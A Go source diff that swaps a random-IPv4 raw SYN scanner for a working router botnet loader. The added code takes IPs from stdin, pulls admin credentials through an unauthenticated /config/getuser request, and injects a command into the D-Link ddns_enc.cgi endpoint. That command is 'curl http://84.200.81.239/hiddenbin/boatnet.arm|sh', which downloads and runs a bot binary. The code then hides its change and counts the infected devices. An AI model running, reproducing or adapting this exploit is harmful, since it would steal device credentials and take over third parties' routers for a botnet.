@@ -1,304 +1,208 @@
 package main
 
 import (
-        "encoding/binary"
+        "bufio"
+        "encoding/base64"
         "fmt"
-        "math/rand"
         "net"
         "os"
-        "runtime"
-        "sync/atomic"
-        "syscall"
+        "strings"
+        "sync"
         "time"
+        "unicode"
 )
 
-var (
-        totalScanned int64
-        totalFound   int64
-        startTime    time.Time
-)
+var statusAttempted, statusLogins, statusFound, statusVuln, statusClean int
 
-// TCP заголовок для raw пакетов
-type TCPHeader struct {
-        SrcPort  uint16
-        DstPort  uint16
-        SeqNum   uint32
-        AckNum   uint32
-        DataOff  uint8 // 4 bits
-        Flags    uint8
-        Window   uint16
-        Checksum uint16
-        Urgent   uint16
-}
+var CONNECT_TIMEOUT time.Duration = 30
+var READ_TIMEOUT time.Duration = 15
+var READ_2_TIMEOUT time.Duration = 5
 
-// IP заголовок 
-type IPHeader struct {
-        VersionIHL uint8
-        ToS        uint8
-        Length     uint16
-        ID         uint16
-        FlagsFragOff uint16
-        TTL        uint8
-        Protocol   uint8
-        Checksum   uint16
-        SrcIP      uint32
-        DstIP      uint32
-}
+var WRITE_TIMEOUT time.Duration = 10
 
-// Pseudo header для TCP checksum
-type PseudoHeader struct {
-        SrcIP    uint32
-        DstIP    uint32
-        Reserved uint8
-        Protocol uint8
-        TCPLen   uint16
-}
+var syncWait sync.WaitGroup
 
-// Расчет checksum
-func checksum(data []byte) uint16 {
-        var sum uint32
-        
-        // Обработка 16-битных слов
-        for i := 0; i < len(data)-1; i += 2 {
-                sum += uint32(data[i])<<8 + uint32(data[i+1])
+var binsIp string = "84.200.81.239"
+var payload string = "curl%20http://84.200.81.239/hiddenbin/boatnet.arm%7Csh"
+
+func zeroByte(a []byte) {
+        for i := 0; i < len(a); i++ {
+                a[i] = 0x00
         }
-        
-        // Обработка последнего байта если есть
-        if len(data)%2 == 1 {
-                sum += uint32(data[len(data)-1]) << 8
-        }
-        
-        // Складываем переносы
-        for sum>>16 > 0 {
-                sum = (sum & 0xFFFF) + (sum >> 16)
-        }
-        
-        return uint16(^sum)
 }
 
-// Генерация случайного IP
-func generateRandomIP() string {
-        for {
-                a := byte(rand.Intn(254) + 1)
-                b := byte(rand.Intn(256))
-                c := byte(rand.Intn(256))
-                d := byte(rand.Intn(254) + 1)
-
-                // Пропускаем приватные диапазоны
-                if !(a == 10 ||
-                        (a == 172 && b >= 16 && b <= 31) ||
-                        (a == 192 && b == 168) ||
-                        a == 127 || a == 0 ||
-                        a == 169 || // Link-local
-                        a >= 224) { // Multicast
-                        return fmt.Sprintf("%d.%d.%d.%d", a, b, c, d)
+func stipByte(a []byte) {
+        for i := 0; i < len(a); i++ {
+                if a[i] == 0x0D || a[i] == 0x0A {
+                        a[i] = 0x00
                 }
         }
 }
 
-// IP string в uint32
-func ipToUint32(ip string) uint32 {
-        parts := make([]byte, 4)
-        fmt.Sscanf(ip, "%d.%d.%d.%d", &parts[0], &parts[1], &parts[2], &parts[3])
-        return uint32(parts[0])<<24 | uint32(parts[1])<<16 | uint32(parts[2])<<8 | uint32(parts[3])
+func setWriteTimeout(conn net.Conn, timeout time.Duration) {
+        conn.SetWriteDeadline(time.Now().Add(timeout * time.Second))
 }
 
-// Создание SYN пакета
-func createSYNPacket(srcIP, dstIP string, srcPort, dstPort uint16) []byte {
-        srcIPUint := ipToUint32(srcIP)
-        dstIPUint := ipToUint32(dstIP)
-        
-        // IP заголовок
-        ipHdr := IPHeader{
-                VersionIHL:   0x45, // IPv4, 20 bytes header
-                ToS:          0,
-                Length:       40, // IP header (20) + TCP header (20)
-                ID:           uint16(rand.Intn(65535)),
-                FlagsFragOff: 0x4000, // Don't Fragment
-                TTL:          64,
-                Protocol:     6, // TCP
-                Checksum:     0, // Заполним позже
-                SrcIP:        srcIPUint,
-                DstIP:        dstIPUint,
-        }
-        
-        // TCP заголовок
-        tcpHdr := TCPHeader{
-                SrcPort:  srcPort,
-                DstPort:  dstPort,
-                SeqNum:   uint32(rand.Intn(4294967295)),
-                AckNum:   0,
-                DataOff:  0x50, // 5 * 4 = 20 bytes, no options
-                Flags:    0x02, // SYN flag
-                Window:   8192,
-                Checksum: 0, // Заполним позже
-                Urgent:   0,
-        }
-        
-        // Преобразуем в байты
-        packet := make([]byte, 40)
-        
-        // IP header
-        packet[0] = ipHdr.VersionIHL
-        packet[1] = ipHdr.ToS
-        binary.BigEndian.PutUint16(packet[2:4], ipHdr.Length)
-        binary.BigEndian.PutUint16(packet[4:6], ipHdr.ID)
-        binary.BigEndian.PutUint16(packet[6:8], ipHdr.FlagsFragOff)
-        packet[8] = ipHdr.TTL
-        packet[9] = ipHdr.Protocol
-        // Checksum пока 0
-        binary.BigEndian.PutUint32(packet[12:16], ipHdr.SrcIP)
-        binary.BigEndian.PutUint32(packet[16:20], ipHdr.DstIP)
-        
-        // TCP header
-        binary.BigEndian.PutUint16(packet[20:22], tcpHdr.SrcPort)
-        binary.BigEndian.PutUint16(packet[22:24], tcpHdr.DstPort)
-        binary.BigEndian.PutUint32(packet[24:28], tcpHdr.SeqNum)
-        binary.BigEndian.PutUint32(packet[28:32], tcpHdr.AckNum)
-        packet[32] = tcpHdr.DataOff
-        packet[33] = tcpHdr.Flags
-        binary.BigEndian.PutUint16(packet[34:36], tcpHdr.Window)
-        // Checksum пока 0
-        binary.BigEndian.PutUint16(packet[38:40], tcpHdr.Urgent)
-        
-        // Рассчитываем IP checksum
-        ipChecksum := checksum(packet[:20])
-        binary.BigEndian.PutUint16(packet[10:12], ipChecksum)
-        
-        // Рассчитываем TCP checksum с pseudo header
-        pseudoHdr := make([]byte, 12)
-        binary.BigEndian.PutUint32(pseudoHdr[0:4], srcIPUint)
-        binary.BigEndian.PutUint32(pseudoHdr[4:8], dstIPUint)
-        pseudoHdr[8] = 0 // Reserved
-        pseudoHdr[9] = 6 // TCP protocol
-        binary.BigEndian.PutUint16(pseudoHdr[10:12], 20) // TCP header length
-        
-        tcpChecksum := checksum(append(pseudoHdr, packet[20:]...))
-        binary.BigEndian.PutUint16(packet[36:38], tcpChecksum)
-        
-        return packet
+func setReadTimeout(conn net.Conn, timeout time.Duration) {
+        conn.SetReadDeadline(time.Now().Add(timeout * time.Second))
 }
 
-// Raw SYN сканирование
-func rawSynScan(dstIP string, port uint16, socket int) {
-        atomic.AddInt64(&totalScanned, 1)
-        
-        // Случайный source port
-        srcPort := uint16(rand.Intn(32767) + 32768)
-        srcIP := "192.168.1.100" // Фейковый source IP
-        
-        // Создаем SYN пакет
-        packet := createSYNPacket(srcIP, dstIP, srcPort, port)
-        
-        // Отправляем пакет
-        dstAddr := &syscall.SockaddrInet4{Port: int(port)}
-        copy(dstAddr.Addr[:], net.ParseIP(dstIP).To4())
-        
-        err := syscall.Sendto(socket, packet, 0, dstAddr)
-        if err == nil {
-                // В реальном SYN scan нужно слушать SYN-ACK ответы
-                // Здесь просто считаем что отправили пакет
-                atomic.AddInt64(&totalFound, 1)
-                fmt.Println(dstIP) // Выводим как найденный
+func getStringInBetween(str string, start string, end string) (result string) {
+
+        s := strings.Index(str, start)
+        if s == -1 {
+                return
+        }
+
+        s += len(start)
+        e := strings.Index(str, end)
+
+        if s > 0 && e > s+1 {
+                return str[s:e]
+        } else {
+                return "null"
         }
 }
 
-// Worker для raw сканирования
-func rawScanWorker(ipChan <-chan string, port uint16, socket int) {
-        for ip := range ipChan {
-                rawSynScan(ip, port, socket)
+func processTarget(target string) {
+
+        statusAttempted++
+
+        conn, err := net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
+        if err != nil {
+                syncWait.Done()
+                return
         }
-}
 
-// Статистика
-func printStats() {
-        ticker := time.NewTicker(5 * time.Second)
-        defer ticker.Stop()
+        setWriteTimeout(conn, WRITE_TIMEOUT)
+        conn.Write([]byte("GET /config/getuser?index=0 HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Language: en-GB,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\nConnection: close\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"))
 
-        for range ticker.C {
-                elapsed := time.Since(startTime)
-                scanned := atomic.LoadInt64(&totalScanned)
-                found := atomic.LoadInt64(&totalFound)
-                rate := float64(scanned) / elapsed.Seconds()
-
-                fmt.Fprintf(os.Stderr, "[INFO] raw_syn_scanner: sent %d SYN packets (%d hosts, %.0f/sec)\n", 
-                        scanned, found, rate)
+        setReadTimeout(conn, READ_TIMEOUT)
+        bytebuf := make([]byte, 512)
+        l, err := conn.Read(bytebuf)
+        if err != nil || l <= 0 {
+                zeroByte(bytebuf)
+                conn.Close()
+                syncWait.Done()
+                return
         }
+
+        stipByte(bytebuf)
+        conn.Close()
+
+        if strings.Contains(string(bytebuf), "name=") && strings.Contains(string(bytebuf), "pass=") && strings.Contains(string(bytebuf), "priv=") {
+                statusFound++
+        } else {
+                zeroByte(bytebuf)
+                syncWait.Done()
+                return
+        }
+
+        usernameIn := getStringInBetween(string(bytebuf), "name=", "pass=")
+        passwordIn := getStringInBetween(string(bytebuf), "pass=", "priv=")
+
+        username := strings.Map(func(r rune) rune {
+                if unicode.IsGraphic(r) {
+                        return r
+                }
+                return -1
+        }, usernameIn)
+
+        password := strings.Map(func(r rune) rune {
+                if unicode.IsGraphic(r) {
+                        return r
+                }
+                return -1
+        }, passwordIn)
+
+        if len(username) <= 0 || len(password) <= 0 {
+                zeroByte(bytebuf)
+                syncWait.Done()
+                return
+        } else {
+                zeroByte(bytebuf)
+                statusLogins++
+        }
+
+        b64auth := base64.StdEncoding.EncodeToString([]byte(username + ":" + password))
+
+        conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
+        if err != nil {
+                syncWait.Done()
+                return
+        }
+
+        setWriteTimeout(conn, WRITE_TIMEOUT)
+        conn.Write([]byte("GET /cgi-bin/ddns_enc.cgi?enable=1&hostname=qq&interval=24&servername=www.dlinkddns.com&provider=custom&account=;" + payload + "; HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Basic " + b64auth + "\r\n\r\n"))
+
+        setReadTimeout(conn, READ_TIMEOUT)
+        l, err = conn.Read(bytebuf)
+        if err != nil || l <= 0 {
+                zeroByte(bytebuf)
+                conn.Close()
+                syncWait.Done()
+                return
+        }
+
+        conn.Close()
+        time.Sleep(15 * time.Second)
+
+        conn, err = net.DialTimeout("tcp", target, CONNECT_TIMEOUT*time.Second)
+        if err != nil {
+                syncWait.Done()
+                return
+        }
+
+        setWriteTimeout(conn, WRITE_TIMEOUT)
+        conn.Write([]byte("GET /cgi-bin/ddns_enc.cgi?enable=0&hostname=qq&interval=24&servername=www.dlinkddns.com&provider=custom&account=aaaa HTTP/1.1\r\nHost: " + target + "\r\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:76.0) Gecko/20100101 Firefox/76.0\r\nAccept-Encoding: gzip, deflate\r\nConnection: keep-alive\r\nAccept: */*\r\nAuthorization: Basic " + b64auth + "\r\n\r\n"))
+
+        setReadTimeout(conn, READ_TIMEOUT)
+        l, err = conn.Read(bytebuf)
+        if err != nil || l <= 0 {
+                zeroByte(bytebuf)
+                conn.Close()
+                syncWait.Done()
+                return
+        }
+
+        if strings.Contains(string(bytebuf), "service=www.dlinkddns.com") {
+                statusVuln++
+        }
+
+        conn.Close()
+        syncWait.Done()
+        return
+
 }
 
 func main() {
-        if len(os.Args) < 3 {
-                fmt.Fprintf(os.Stderr, "Usage: %s <port> <threads> [rate_limit]\n", os.Args[0])
-                fmt.Fprintf(os.Stderr, "Example: %s 23 1000 5000\n", os.Args[0])
-                fmt.Fprintf(os.Stderr, "\nRaw SYN packet scanner (zmap style)\n")
-                fmt.Fprintf(os.Stderr, "Requires root privileges for raw socket access\n")
-                fmt.Fprintf(os.Stderr, "Output: Target IP addresses (one per line)\n")
-                os.Exit(1)
+
+        var i int = 0
+
+        if len(os.Args) != 2 {
+                fmt.Println("[Scanner] Missing argument (port/listen)")
+                return
         }
 
-        port := 23
-        threads := 1000
-        rateLimit := 5000
+        go func() {
+                i = 0
+                for {
+                        fmt.Printf("%d's | Total %d | Device Found: %d | Authenticated: %d | Payload Sent: %d\r\n", i, statusAttempted, statusFound, statusLogins, statusVuln)
+                        time.Sleep(1 * time.Second)
+                        i++
+                }
+        }()
 
-        fmt.Sscanf(os.Args[1], "%d", &port)
-        fmt.Sscanf(os.Args[2], "%d", &threads)
-        
-        if len(os.Args) > 3 {
-                fmt.Sscanf(os.Args[3], "%d", &rateLimit)
-        }
-
-        // Создаем raw socket
-        socket, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
-        if err != nil {
-                fmt.Fprintf(os.Stderr, "[ERROR] Failed to create raw socket: %v\n", err)
-                fmt.Fprintf(os.Stderr, "[ERROR] This scanner requires root privileges\n")
-                fmt.Fprintf(os.Stderr, "[ERROR] Run with: sudo %s %s\n", os.Args[0], os.Args[1])
-                os.Exit(1)
-        }
-        defer syscall.Close(socket)
-
-        // Включаем IP_HDRINCL для включения IP заголовка
-        err = syscall.SetsockoptInt(socket, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
-        if err != nil {
-                fmt.Fprintf(os.Stderr, "[ERROR] Failed to set IP_HDRINCL: %v\n", err)
-                os.Exit(1)
-        }
-
-        // Инициализация
-        runtime.GOMAXPROCS(runtime.NumCPU())
-        rand.Seed(time.Now().UnixNano())
-        startTime = time.Now()
-
-        fmt.Fprintf(os.Stderr, "[INFO] raw_syn_scanner: starting raw SYN scan\n")
-        fmt.Fprintf(os.Stderr, "[INFO] raw_syn_scanner: target port %d, %d threads, %d rate limit\n", 
-                port, threads, rateLimit)
-        fmt.Fprintf(os.Stderr, "[INFO] raw_syn_scanner: sending raw SYN packets to random IPv4 space\n")
-        fmt.Fprintf(os.Stderr, "[INFO] raw_syn_scanner: target IPs will be printed to stdout\n")
-
-        // Каналы
-        ipChan := make(chan string, threads*10)
-
-        // Статистика
-        go printStats()
-
-        // Запуск воркеров
-        for i := 0; i < threads; i++ {
-                go rawScanWorker(ipChan, uint16(port), socket)
-        }
-
-        // Rate limiting
-        rateTicker := time.NewTicker(time.Second / time.Duration(rateLimit))
-        defer rateTicker.Stop()
-
-        // Генерация IP с rate limiting
         for {
-                select {
-                case <-rateTicker.C:
-                        select {
-                        case ipChan <- generateRandomIP():
-                        default:
-                                // Канал полный, пропускаем
+                r := bufio.NewReader(os.Stdin)
+                scan := bufio.NewScanner(r)
+                for scan.Scan() {
+                        if os.Args[1] == "listen" {
+                                go processTarget(scan.Text())
+                        } else {
+                                go processTarget(scan.Text() + ":" + os.Args[1])
                         }
+                        syncWait.Add(1)
                 }
         }
 }
